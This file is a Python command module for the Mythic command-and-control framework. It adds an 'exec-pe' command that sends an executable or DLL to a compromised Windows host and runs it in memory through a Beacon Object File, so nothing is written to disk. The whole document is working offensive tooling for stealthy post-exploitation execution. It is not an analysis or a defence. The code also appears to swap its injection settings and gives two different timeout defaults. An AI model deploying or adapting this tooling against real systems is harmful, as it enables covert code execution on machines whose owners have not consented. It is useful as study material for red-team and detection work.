from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging
import json
import asyncio

from .Utils.u import *

class ExecPeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="file",
                display_name="PE File",
                type=ParameterType.String,
                dynamic_query_function=self.get_exe_files,
                description="PE file to execute in memory",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="args",
                cli_name="args",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the PE",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="export_function",
                cli_name="export_function",
                display_name="Export Function",
                type=ParameterType.String,
                description="Function to execute from a DLL (optional)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="key",
                cli_name="key",
                display_name="Memory Key",
                type=ParameterType.String,
                description="Key to keep the PE in memory for later execution",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="timeout",
                cli_name="timeout",
                display_name="Timeout",
                type=ParameterType.Number,
                description="Timeout to wait for PE execution (default: 5s)",
                default_value=5,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
        ]

    async def get_exe_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            IsDownloadFromAgent=False,
            IsScreenshot=False,
            IsPayload=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                if len(args) >= 1:
                    self.add_arg("file", args[0])
                if len(args) >= 2:
                    self.add_arg("args", " ".join(args[1:]))

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)


class ExecPeCommand(CommandBase):
    cmd = "exec-pe"
    needs_admin = False
    help_cmd = "exec-pe -file [file_name] [-args \"arguments\"] [-export_function function_name] [-key memory_key] [-timeout seconds]"
    description = """
    Execute a PE file in memory without touching disk.
    
    This command uses a Beacon Object File (BOF) to perform in-memory execution of PE files.
    Supports both EXEs and DLLs (with optional exported function execution).
    
    Features:
    - In-memory execution (no disk writes)
    - Support for both EXEs and DLLs
    - Optional function export execution for DLLs
    - Memory persistence with keys for repeated execution
    
    Category: Beacon Object File (BOF)
    Source: https://github.com/entropy-z/Injection-BOFs/blob/master/PE/Loader.cc
    """
    version = 1
    author = "@Oblivion"
    argument_class = ExecPeArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        try:
            content: bytes = await get_content_by_name("kh_exec-pe.x64.o", task.Task.ID)
            if not content:
                raise Exception("Failed to load BOF file: kh_exec-pe.x64.o")
            
            file_name = task.args.get_arg("file")
            
            # Buscar o arquivo pelo nome em vez de pelo ID
            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                CallbackID=task.Callback.ID,
                Filename=file_name,
                LimitByCallback=False
            ))
            
            if not file_resp.Success or len(file_resp.Files) == 0:
                raise Exception(f"Failed to find PE file: {file_name}")
                
            file_id = file_resp.Files[0].AgentFileId
            file_buff = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=file_id
            ))
            
            if not file_buff.Success:
                raise Exception(f"Failed to load PE file content: {file_name}")

            # Restante do código permanece o mesmo...
            args = task.args.get_arg("args") or ''
            export_fnc = task.args.get_arg("export_function") or ''
            mem_key = task.args.get_arg("key") or ''
            timeout = task.args.get_arg("timeout") or 10

            display_params = f" -file {file_name}"
            if args:
                display_params += f" -args \"{args}\""
            if export_fnc:
                display_params += f" -export_function {export_fnc}"
            if mem_key:
                display_params += f" -key {mem_key}"
            if timeout != 10:
                display_params += f" -timeout {timeout}"

            AgentData  = await StorageExtract(task.Callback.AgentCallbackID)
            alloc_type = AgentData["injection"]["write_method"]
            write_type = AgentData["injection"]["alloc_method"]

            bof_args = [
                {"type": "bytes", "value": file_buff.Content.hex()}, 
                {"type": "char" , "value": args},            
                {"type": "char" , "value": export_fnc},      
                {"type": "char" , "value": mem_key},         
                {"type": "int32", "value": timeout},       
                {"type": "int32", "value": alloc_type},
                {"type": "int32", "value": write_type},
            ]

            task.args.remove_arg("file")
            task.args.remove_arg("args")
            task.args.remove_arg("key")
            task.args.remove_arg("export_function")
            task.args.remove_arg("timeout")

            task.args.add_arg("bof_file", content.hex())
            task.args.add_arg("bof_id", 0, ParameterType.Number)
            task.args.add_arg("bof_args", json.dumps(bof_args))

            return PTTaskCreateTaskingMessageResponse(
                TaskID=task.Task.ID,
                CommandName="exec-bof",
                TokenID=task.Task.TokenID,
                DisplayParams=display_params
            )
        
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error creating task: {str(e)}".encode()
            ))
            raise
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if not response:
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )

        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )